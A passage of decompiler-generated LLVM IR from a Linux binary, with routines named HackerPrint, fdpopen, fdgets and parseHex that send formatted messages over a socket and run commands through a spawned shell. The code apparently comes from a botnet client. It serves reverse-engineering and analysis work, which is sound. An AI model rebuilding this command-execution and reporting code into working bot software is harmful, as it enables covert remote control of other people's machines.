  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_8063500.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v1_80489fc = call i32 @getdtablesize(i32 %tmp11)
  %tmp19 = icmp slt i32 %v1_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v1_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_8063500.13, align 256
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v1_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v1_8048a56 = call i32 @__vfork(i32 %tmp11)
  %v13_8048a64 = icmp eq i32 %v1_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v1_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8058e5f.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058e5c.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058e59.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_8063500.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v1_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048a56, { 1, 2, 0 }
  uselistorder i32 %v1_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_8063500.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_8063500.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_8063500.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_8063500.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8058e80.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
